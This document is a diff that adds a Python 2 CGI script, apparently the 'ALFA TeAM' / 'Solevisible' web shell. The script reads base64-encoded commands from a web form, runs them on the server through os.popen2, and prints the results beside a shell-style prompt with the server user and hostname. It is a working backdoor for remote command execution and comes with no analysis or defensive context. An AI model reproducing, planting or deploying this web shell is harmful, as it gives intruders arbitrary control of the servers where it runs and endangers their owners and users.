@@ -1,0 +1,60 @@
+#!/usr/bin/python
+try:
+	import cgitb; cgitb.enable()
+except:
+	pass
+import sys,cgi,os,getpass,base64,urllib
+sys.stderr = sys.stdout
+from time import strftime
+import traceback
+from StringIO import StringIO
+from traceback import print_exc
+if os.environ.has_key("SCRIPT_NAME"):
+	scriptname = os.environ["SCRIPT_NAME"]
+else:
+	scriptname = ""
+def alfaCmd(c):
+	child_stdin, child_stdout = os.popen2(c)
+	child_stdin.close()
+	result = child_stdout.read()
+	child_stdout.close()
+	return result
+form = cgi.FieldStorage()
+cmd = form.getvalue('c')
+dir = form.getvalue('d')
+if cmd:
+	cmd = urllib.unquote(base64.b64decode(cmd))
+if dir:
+	dir = urllib.unquote(base64.b64decode(dir))
+if cmd:
+	if cmd[0:3] == 'cd ':
+		ncmd = 'cd ' + dir + ';' + cmd + ';pwd'
+		CurrentDir = alfaCmd(ncmd).replace('\n','')
+if not dir and 'CurrentDir' not in locals():
+	CurrentDir = alfaCmd('pwd').replace('\n','')
+else:
+	if 'CurrentDir' not in locals():
+		CurrentDir = dir
+Prompt = '['+getpass.getuser()+'@'+os.environ["SERVER_NAME"]+' '+CurrentDir+']$'
+theform = '<form onsubmit="this.c.value=btoa(unescape(encodeURIComponent(this.c.value)));this.d.value=btoa(unescape(encodeURIComponent(this.d.value)));" name="f" method="POST" action="'+scriptname+'"><input type="hidden" name="d" value="'+CurrentDir+'">'+Prompt+' <input type="text" name="c" ><input type="submit" size="30" value=">>"></form>'
+errormess = '<center><h2>Something Went Wrong</h2><br><pre>'
+if __name__ == '__main__':
+	print "Content-type: text/html\r\n"
+	print '<body onload="document.f.c.focus();" bgcolor="#000000" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0" text="#FFFFFF"><table border="1" width="100%" cellspacing="0" cellpadding="2"><tr><font color="red"><b>Coded by sole sad & invisible ~ solevisible@gmail.com</b></font><td bgcolor="#000000" bordercolor="#FFFFFF" align="center" width="1%"><b><font size="2" color="#ff0000">#</font></b></td><td bgcolor="#000000" width="98%"><font face="Verdana" size="2"><b> <font color="#22E228"><b>Solevisible Cgi Python</b></font> Connected to '+os.environ["SERVER_NAME"]+'</b></td></tr></table>'
+	print '<html><head><title>Coded by ALFA TeAM - CGI Python</title><meta charset="UTF-8"></head>'
+	print theform
+	if cmd:
+		print '<br><br>'
+		print '<b>Command : ', cmd, '</b><br><br>'
+		print 'Result : <br><br>'
+		try:
+			cmd = 'cd ' + CurrentDir + ';' + cmd
+			print '<xmp>'+alfaCmd(cmd)+'</xmp>'
+		except Exception, e:
+			print errormess
+			f = StringIO()
+			print_exc(file=f)
+			a = f.getvalue().splitlines()
+			for line in a:
+				print line
+	print '</body></html>'
